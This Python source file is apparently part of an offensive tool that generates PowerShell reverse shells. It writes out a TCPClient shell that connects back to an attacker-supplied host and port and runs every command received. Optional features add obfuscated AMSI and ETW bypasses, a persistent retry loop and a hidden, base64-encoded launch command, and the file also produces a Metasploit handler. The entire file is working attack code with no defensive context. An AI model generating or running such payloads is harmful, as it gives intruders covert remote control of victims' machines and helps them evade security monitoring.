import base64
import random
from .base import (
    RandomNamePool, ShellGenerator, ShellOptions, ShellResult, msf_handler, LISTENER_FMT,
)
from .obfuscate import (
    ps_amsi_bypass, ps_etw_bypass,
    ps_concat_split, ps_invoke_expression_alt,
)

_VARIANTS = ["tcpclient", "tcpclient_b64"]


class PowerShellGenerator(ShellGenerator):
    language = "powershell"

    def _generate(self, opts: ShellOptions, names: RandomNamePool | None) -> ShellResult:
        use_b64 = opts.arch == "x64" or (names is not None and random.random() > 0.5)
        variant = "tcpclient_b64" if use_b64 else "tcpclient"

        raw = self._tcpclient_raw(opts, names)

        if names:
            # Prepend AMSI and ETW bypasses, both obfuscated
            bypass = ps_amsi_bypass(obfuscate=True) + ";" + ps_etw_bypass(obfuscate=True) + ";"
            raw = bypass + raw

        if opts.retry:
            raw = f"while($true){{try{{{raw}}}catch{{Start-Sleep -s 30}}}}"

        if use_b64:
            encoded = base64.b64encode(raw.encode("utf-16-le")).decode()
            cmd = f"powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {encoded}"
        else:
            cmd = f"powershell -NoP -NonI -W Hidden -Exec Bypass \"{raw}\""

        return ShellResult(
            command=cmd,
            variant=variant,
            language=self.language,
            arch=opts.arch,
            listener=LISTENER_FMT.format(lport=opts.lport),
            tty_upgrade=None,
            msf_compat=msf_handler("cmd/windows/powershell_reverse_shell", opts.lhost, opts.lport),
        )

    def _tcpclient_raw(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
        buf = self._var("buf", names)
        data = self._var("data", names)
        ob = self._var("ob", names)
        ob2 = self._var("ob2", names)
        sb = self._var("sb", names)

        if names:
            tcp_class = f"({ps_concat_split('System.Net.Sockets.TCPClient')})"
            enc_class = f"({ps_concat_split('System.Text.ASCIIEncoding')})"
        else:
            tcp_class = "'System.Net.Sockets.TCPClient'"
            enc_class = "'System.Text.ASCIIEncoding'"

        if names:
            invoke = f"[ScriptBlock]::Create(${data}).Invoke()"
        else:
            invoke = f"iex ${data}"

        return (
            f"$c=New-Object ({tcp_class})('{opts.lhost}',{opts.lport});"
            f"$s=$c.GetStream();"
            f"[byte[]]${buf}=0..65535|%{{0}};"
            f"while(($i=$s.Read(${buf},0,${buf}.Length)) -ne 0){{"
            f"${data}=(New-Object ({enc_class})).GetString(${buf},0,$i);"
            f"${ob}=({invoke} 2>&1|Out-String);"
            f"${ob2}=${ob}+'PS '+(pwd).Path+'> ';"
            f"${sb}=[text.encoding]::ASCII.GetBytes(${ob2});"
            f"$s.Write(${sb},0,${sb}.Length);$s.Flush()}};"
            f"$c.Close()"
        )
